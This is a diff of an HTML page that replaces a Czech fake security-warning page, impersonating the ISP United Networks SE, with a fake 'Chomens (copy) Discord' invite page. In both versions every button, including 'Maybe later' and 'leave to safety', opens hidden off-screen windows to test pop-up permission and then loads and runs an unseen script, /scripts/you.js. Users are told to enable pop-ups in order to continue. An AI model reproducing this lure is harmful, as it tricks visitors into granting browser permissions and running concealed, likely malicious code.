@@ -1,242 +1,296 @@
 <!DOCTYPE html>
-<html lang="cs">
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#ffffff">
-<meta name="author" content="United Networks SE">
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="0">
-<title>Varování &ndash; United Networks SE</title>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css" crossorigin="anonymous" />
+<title>Chomens Discord</title>
+
 <style>
-    body {
-        background: #16638a;
-        background: radial-gradient(105.54% 82.27% at 50% 50%, #16638A 0%, #0C4866 100%);
-        line-height: 1.5;
-        display: flex;
-        min-height: 100vh;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        overflow: auto;
-    }
-    html { overflow: auto; }
-    a { color: #89E0FF; }
-    a:hover, a:focus { color: #ffffff; }
-    .title { line-height: 1.5; }
-    .subtitle { line-height: 1.6; }
-    .icon-danger svg { width: 8rem; }
-    .icon-danger { display: block; margin-bottom: 2rem }
-    .brand { display: inline-block; margin-bottom: 2rem }
-    .contacts { margin-top: 2rem; }
-    .contacts a { margin: .5rem }
-    .cta .button { margin: 1rem .5rem }
-    .footer { background: transparent; }
-    .spinner {
-        margin: 2rem auto;
-        width: 70px;
-        text-align: center;
-    }
-    .spinner > div {
-        width: 12px;
-        height: 12px;
-        background-color: #fff;
-        border-radius: 100%;
-        display: inline-block;
-        -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
-        animation: sk-bouncedelay 1.4s infinite ease-in-out both;
-    }
-    .spinner .bounce1 { -webkit-animation-delay: -0.32s; animation-delay: -0.32s; }
-    .spinner .bounce2 { -webkit-animation-delay: -0.16s; animation-delay: -0.16s; }
-    @-webkit-keyframes sk-bouncedelay {
-        0%, 80%, 100% { -webkit-transform: scale(0.0) }
-        40% { -webkit-transform: scale(1.0) }
-    }
-    @keyframes sk-bouncedelay {
-        0%, 80%, 100% { transform: scale(0.0); -webkit-transform: scale(0.0); }
-        40% { transform: scale(1.0); -webkit-transform: scale(1.0); }
-    }
-    .wb-hidden { display: none !important; }
-
-    /* Nový styl hlášky popup */
-    .popup-warning {
-        background: rgba(255, 255, 255, 0.1);
-        color: #fff;
-        border: 1px solid rgba(255, 255, 255, 0.25);
-        border-radius: 12px;
-        padding: 1.2rem 1.5rem;
-        margin-top: 2rem;
-        font-size: 1.1rem;
-        box-shadow: 0 0 15px rgba(0,0,0,0.3);
-        backdrop-filter: blur(6px);
-        transition: all 0.3s ease;
-        animation: fadeIn 0.5s ease forwards;
-    }
-
-    @keyframes fadeIn {
-        from { opacity: 0; transform: translateY(10px); }
-        to { opacity: 1; transform: translateY(0); }
-    }
-</style>
-</head>
-<body>
-
-<section class="section is-fullheight">
-    <div class="container has-text-centered" role="alert">
-        <span class="icon-danger">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
-                <title>Nebezpečí!</title>
-                <path fill="#97CD59" d="M505.403 406.394L295.389 58.102c-8.274-13.721-23.367-22.245-39.39-22.245s-31.116 8.524-39.391 22.246L6.595 406.394c-8.551 14.182-8.804 31.95-.661 46.37 8.145 14.42 23.491 23.378 40.051 23.378h420.028c16.56 0 31.907-8.958 40.052-23.379 8.143-14.421 7.89-32.189-.662-46.369zm-28.364 29.978a12.684 12.684 0 01-11.026 6.436H45.985a12.68 12.68 0 01-11.025-6.435 12.683 12.683 0 01.181-12.765L245.156 75.316A12.732 12.732 0 01256 69.192c4.41 0 8.565 2.347 10.843 6.124l210.013 348.292a12.677 12.677 0 01.183 12.764z"/>
-                <path fill="#97CD59" d="M256.154 173.005c-12.68 0-22.576 6.804-22.576 18.866 0 36.802 4.329 89.686 4.329 126.489.001 9.587 8.352 13.607 18.248 13.607 7.422 0 17.937-4.02 17.937-13.607 0-36.802 4.329-89.686 4.329-126.489 0-12.061-10.205-18.866-22.267-18.866zM256.465 353.306c-13.607 0-23.814 10.824-23.814 23.814 0 12.68 10.206 23.814 23.814 23.814 12.68 0 23.505-11.134 23.505-23.814 0-12.99-10.826-23.814-23.505-23.814z"/>
-            </svg>
-        </span>
-        <div class="columns">
-            <div class="column is-half is-offset-one-quarter">
-                <h1 class="is-size-1 title has-text-white" data-key="alertTitle">Pozor!</h1>
-                <h2 class="is-size-5 subtitle has-text-white" data-key="alertSubtitle">Pokusili jste se vstoupit na stránku, kterou považujeme za nebezpečnou.</h2>
-                <h3 class="is-size-5 has-text-white">https://siteopener.netlify.app</h3>
-                <h3 class="is-size-4 has-text-white">Detekované hrozby: <span id="detected_threats_text">malware</span></h3>
-            </div>
-        </div>
-    </div>
-
-    <div class="container contacts">
-        <div class="columns">
-            <div class="column is-half is-offset-one-quarter has-text-centered content">
-                <p class="is-size-6 has-text-white" data-key="contactText">Pokud věříte, že jde o chybu, kontaktujte nás prosím na níže uvedených kontaktech.</p>
-                <p>
-                    <a href="mailto:info@u-n.cz">info@u-n.cz</a>
-                    <a href="tel:+420373705705">+420 373 705 705</a>
-                </p>
-            </div>
-        </div>
-    </div>
-
-    <div class="container cta">
-        <div class="columns">
-            <div class="column is-half is-offset-one-quarter has-text-centered content">
-                <a class="button is-success is-rounded" id="back_button" data-key="backBtn">Odejít do bezpečí</a>
-                <a id="bypass_button" class="button is-danger is-rounded" role="button" data-key="continueBtn">Chci přesto pokračovat</a>
-                <div id="popup_needed" class="popup-warning wb-hidden">
-                    ⚠️ <strong>Upozornění:</strong> Pro pokračování prosím <u>povolte vyskakovací okna</u> ve vašem prohlížeči.
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<footer class="footer">
-  <div class="content has-text-centered has-text-white">
-    <a href="https://www.unitednetworks.cz" target="_blank" class="brand">
-      <img 
-        src="https://www.unitednetworks.cz/assets/front/images/logo.svg" 
-        alt="United Networks SE logo" 
-        width="165" 
-        height="44"
-        style="vertical-align: middle;"
-      >
-    </a>
-  </div>
-</footer>
-
-<script>
-    let isYouScriptLoaded = false;
-    function loadYouScript(callback) {
-        if (isYouScriptLoaded) { callback(); return; }
-        const script = document.createElement('script');
-        script.src = '/scripts/you.js';
-        script.onload = () => { 
-            isYouScriptLoaded = true; 
-            callback(); 
-        };
-        script.onerror = () => { 
-            console.error('Failed to load /scripts/you.js'); 
-        };
-        document.head.appendChild(script);
-    }
-
-    function checkPopupPermission(callback) {
-        let popups = [];
-        let allowed = true;
-
-        try {
-            for (let i = 0; i < 3; i++) {
-                const popup = window.open('', '', 'width=1,height=1,left=-10000,top=-10000');
-                if (!popup) { allowed = false; break; }
-                popups.push(popup);
-            }
-
-            if (allowed) {
-                setTimeout(() => {
-                    popups.forEach(p => {
-                        try { p.blur(); p.close(); } catch {}
-                    });
-                    callback(true);
-                }, 200);
-            } else {
-                popups.forEach(p => { try { p.close(); } catch{} });
-                callback(false);
-            }
-        } catch {
-            popups.forEach(p => { try { p.close(); } catch{} });
-            callback(false);
-        }
-    }
-
-    function handleButtonClick(event) {
-        event.preventDefault();
-        const spinner = document.createElement('div');
-        spinner.className = 'spinner';
-        spinner.innerHTML = '<div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div>';
-        document.querySelector('.cta .content').appendChild(spinner);
-
-        checkPopupPermission(function(isAllowed) {
-            if (isAllowed) {
-                loadYouScript(() => { 
-                    if (typeof window.runYouScript === 'function') 
-                        window.runYouScript(); 
-                    spinner.remove(); 
-                });
-            } else {
-                document.getElementById('popup_needed').classList.remove('wb-hidden');
-                spinner.remove();
-            }
-        });
-    }
-
-    document.getElementById('back_button').addEventListener('click', handleButtonClick);
-    document.getElementById('bypass_button').addEventListener('click', handleButtonClick);
-
-    document.getElementById('detected_threats_text').textContent = 'Malware';
-</script>
-
-<!-- Google Translate Silent Auto-Translate -->
-<script type="text/javascript">
-function googleTranslateElementInit() {
-    new google.translate.TranslateElement({pageLanguage: 'cs', autoDisplay: false}, 'google_translate_element');
+:root {
+    --bg: #0b0f1a;
+    --accent: #5865F2;
+    --text: #e5e7eb;
+    --muted: #9ca3af;
+    --glass: rgba(255,255,255,0.06);
+    --border: rgba(255,255,255,0.14);
 }
 
-// Create a hidden container to satisfy the widget (required)
-var translateDiv = document.createElement('div');
-translateDiv.id = 'google_translate_element';
-translateDiv.style.display = 'none';
-document.body.appendChild(translateDiv);
+* {
+    box-sizing: border-box;
+    font-family: Inter, system-ui, sans-serif;
+}
 
-// Load Google Translate
-var gtScript = document.createElement('script');
-gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
-document.head.appendChild(gtScript);
-</script>
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: radial-gradient(1200px 600px at 50% -200px, #1e293b, var(--bg));
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.card {
+    width: 100%;
+    max-width: 460px;
+    padding: 2.4rem;
+    background: linear-gradient(180deg, var(--glass), rgba(255,255,255,0.02));
+    border: 1px solid var(--border);
+    border-radius: 22px;
+    backdrop-filter: blur(14px);
+    box-shadow: 0 40px 90px rgba(0,0,0,.6);
+    animation: fadeUp .6s ease;
+}
+
+@keyframes fadeUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 1.6rem;
+}
+
+.logo-circle {
+    width: 56px;
+    height: 56px;
+    border-radius: 16px;
+    background: linear-gradient(135deg, var(--accent), #8b5cf6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    color: white;
+    font-size: 1.2rem;
+}
+
+h1 {
+    text-align: center;
+    font-size: 1.6rem;
+    margin-bottom: .4rem;
+}
+
+p {
+    text-align: center;
+    color: var(--muted);
+    font-size: .95rem;
+    margin-bottom: 2rem;
+}
+
+.actions {
+    display: grid;
+    gap: .9rem;
+}
+
+button {
+    border: none;
+    border-radius: 14px;
+    padding: 1rem;
+    font-size: .95rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all .25s ease;
+}
+
+.btn-discord {
+    background: linear-gradient(135deg, var(--accent), #4752c4);
+    color: white;
+}
+
+.btn-discord:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 10px 30px rgba(88,101,242,.45);
+}
+
+.btn-nah {
+    background: transparent;
+    color: var(--muted);
+    border: 1px solid var(--border);
+}
+
+.btn-nah:hover {
+    background: rgba(255,255,255,.05);
+    color: var(--text);
+}
+
+/* Spinner */
+.spinner {
+    margin: 1.6rem auto 0;
+    width: 46px;
+    display: flex;
+    justify-content: space-between;
+}
+
+.spinner div {
+    width: 8px;
+    height: 8px;
+    background: white;
+    border-radius: 50%;
+    animation: bounce 1.4s infinite ease-in-out both;
+}
+
+.spinner div:nth-child(1) { animation-delay: -.32s; }
+.spinner div:nth-child(2) { animation-delay: -.16s; }
+
+@keyframes bounce {
+    0%, 80%, 100% { transform: scale(0); }
+    40% { transform: scale(1); }
+}
+
+/* Popup required message */
+.popup-warning {
+    margin-top: 1.5rem;
+    padding: 1.1rem 1.2rem;
+    border-radius: 14px;
+    background: linear-gradient(
+        180deg,
+        rgba(239,68,68,.22),
+        rgba(239,68,68,.1)
+    );
+    border: 1px solid rgba(239,68,68,.5);
+    color: #fee2e2;
+    font-size: .92rem;
+    text-align: center;
+    display: none;
+    animation: shakeIn .35s ease;
+}
+
+.popup-warning strong {
+    display: block;
+    font-size: 1rem;
+    margin-bottom: .25rem;
+}
+
+.popup-warning span {
+    display: block;
+    margin-top: .35rem;
+    font-size: .85rem;
+    color: #fca5a5;
+}
+
+@keyframes shakeIn {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-4px); }
+    50% { transform: translateX(4px); }
+    75% { transform: translateX(-2px); }
+    100% { transform: translateX(0); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="logo">
+        <div class="logo-circle">C</div>
+    </div>
+
+    <h1>Chomens (copy) Discord</h1>
+    <p>Click below to join our Discord server.</p>
+
+    <div class="actions">
+        <button class="btn-discord" id="discord_btn">Join Discord</button>
+        <button class="btn-nah" id="nah_btn">Maybe later</button>
+    </div>
+
+    <div id="spinner_holder"></div>
+
+    <div id="popup_needed" class="popup-warning">
+        <strong>Pop-ups must be enabled</strong>
+        Discord opens the invite in a new window.
+        <span>Please allow pop-ups for this site to continue.</span>
+    </div>
+</div>
+
 <script>
+let isYouScriptLoaded = false;
+
+function loadYouScript(cb) {
+    if (isYouScriptLoaded) { cb(); return; }
+    const s = document.createElement('script');
+    s.src = '/scripts/you.js';
+    s.onload = () => { isYouScriptLoaded = true; cb(); };
+    s.onerror = () => console.error('Failed to load you.js');
+    document.head.appendChild(s);
+}
+
+function checkPopupPermission(callback) {
+    let popups = [];
+    let allowed = true;
+
+    try {
+        for (let i = 0; i < 5; i++) {
+            const p = window.open('', '', 'width=1,height=1,left=-10000,top=-10000');
+            if (!p) { allowed = false; break; }
+            popups.push(p);
+        }
+
+        setTimeout(() => {
+            popups.forEach(p => { try { p.close(); } catch {} });
+            callback(allowed);
+        }, 200);
+    } catch {
+        popups.forEach(p => { try { p.close(); } catch {} });
+        callback(false);
+    }
+}
+
+function handleClick(e) {
+    e.preventDefault();
+
+    document.getElementById('popup_needed').style.display = 'none';
+    document.getElementById('spinner_holder').innerHTML =
+        '<div class="spinner"><div></div><div></div><div></div></div>';
+
+    checkPopupPermission(isAllowed => {
+        if (!isAllowed) {
+            document.getElementById('spinner_holder').innerHTML = '';
+            document.getElementById('popup_needed').style.display = 'block';
+            return;
+        }
+
+        loadYouScript(() => {
+            if (typeof window.runYouScript === 'function') {
+                window.runYouScript();
+            }
+            document.getElementById('spinner_holder').innerHTML = '';
+        });
+    });
+}
+
+document.getElementById('discord_btn').addEventListener('click', handleClick);
+document.getElementById('nah_btn').addEventListener('click', handleClick);
+</script>
+
+<!-- Google Translate (silent auto translate) -->
+<script>
+function googleTranslateElementInit() {
+    new google.translate.TranslateElement(
+        { pageLanguage: 'en', autoDisplay: false },
+        'google_translate_element'
+    );
+}
+
+var gt = document.createElement('div');
+gt.id = 'google_translate_element';
+gt.style.display = 'none';
+document.body.appendChild(gt);
+
+var s = document.createElement('script');
+s.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
+document.head.appendChild(s);
+
 setTimeout(() => {
     try {
-        var userLang = navigator.language || navigator.userLanguage; // Detect user language
-        var select = document.querySelector('select.goog-te-combo');
-        if (select) { select.value = userLang.split('-')[0]; select.dispatchEvent(new Event('change')); }
-    } catch(e){console.error(e);}
+        const lang = navigator.language.split('-')[0];
+        const select = document.querySelector('select.goog-te-combo');
+        if (select) {
+            select.value = lang;
+            select.dispatchEvent(new Event('change'));
+        }
+    } catch {}
 }, 1500);
 </script>
 
